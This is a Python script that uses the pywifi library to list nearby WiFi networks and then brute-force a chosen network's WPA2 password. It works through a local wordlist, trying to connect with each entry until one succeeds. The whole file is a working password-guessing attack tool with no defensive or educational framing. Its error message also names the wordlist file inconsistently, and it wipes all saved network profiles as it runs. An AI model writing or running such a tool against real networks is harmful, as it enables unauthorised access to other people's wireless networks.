import pywifi
#  You need to download the module comtypes
from pywifi import const
import time


#  Determine if it is connected to wifi
def get_status():
    #  Create a wireless object
    wifi = pywifi.PyWiFi()
    #  Get the first wireless card
    ifaces = wifi.interfaces()[0]
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


def get_wifies():
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    #  scanning wifi
    ifaces.scan()
    #  Get scan results
    result = ifaces.scan_results()
    return result


def wifi_disconnect():
    #  Grab the net port
    wifi = pywifi.PyWiFi()
    #  Get the first wireless card
    ifaces = wifi.interfaces()[0]
    #  Disconnect all connections
    ifaces.disconnect()
    time.sleep(1)


def wifi_connect(ssid, password):
    #  Grab the net port
    wifi = pywifi.PyWiFi()
    #  Get the first wireless card
    ifaces = wifi.interfaces()[0]
    #  Disconnect all connections
    ifaces.disconnect()
    time.sleep(1)

    wifiStatus = ifaces.status()
    if wifiStatus == const.IFACE_DISCONNECTED:
        #  establish wifi The connection file for
        profile = pywifi.Profile()
        #  To connect wifi The name of
        profile.ssid = ssid
        #  Open to network card
        profile.auth = const.AUTH_ALG_OPEN
        # wifi encryption algorithm
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #  Encryption unit
        profile.cipher = const.CIPHER_TYPE_CCMP
        #  password
        profile.key = password
        #  Delete all wifi file
        ifaces.remove_all_network_profiles()
        #  Set up a new connection file
        tep_profile = ifaces.add_network_profile(profile)
        #  Test the connection with a new connection file
        ifaces.connect(tep_profile)
        #  to wifi A connection time
        time.sleep(.5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        return True


def start():
    connected_to_wifi = get_status()
    if connected_to_wifi:
        wifi_disconnect()
    print("The WIFI around you:")
    wifi_list = get_wifies()
    unique_list = list(set([item.ssid for item in wifi_list]))
    for index, item in enumerate(unique_list):
        if item != "":
            print(f'{index}=> {item}')
    chosen = input("Enter WIFI ID: ")
    chosen = int(chosen)
    chosen = unique_list[chosen]
    with open('words.txt', 'r') as f:
        lines = f.readlines()
        password_list = [str(line).strip().replace(' ', '').replace('\n', '') for line in lines]
    for password in password_list:
        print(f"Checking {password}")
        result = wifi_connect(chosen, password)
        print("[FAILED]" if result is False else "[SUCCESS]")
        if result is True:
            break


if __name__ == "__main__":
    try:
        start()
    except:
        print("Please check your if your wifi is on")
        print("Please make sure your wordlist file is in the directory with this name: word.txt")
